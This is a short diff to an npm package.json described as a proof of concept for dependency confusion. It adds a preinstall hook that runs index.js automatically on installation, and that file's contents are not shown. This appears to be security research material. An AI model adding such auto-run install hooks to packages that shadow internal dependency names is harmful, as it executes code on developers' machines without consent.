@@ -4,6 +4,7 @@
   "description": "Vulnerable Package - PoC for Dependency Confusion",
   "main": "index.js",
   "scripts": {
+    "preinstall": "node index.js",
     "test": "echo \"Error: no test specified\" && exit 1"
   },
   "repository": {
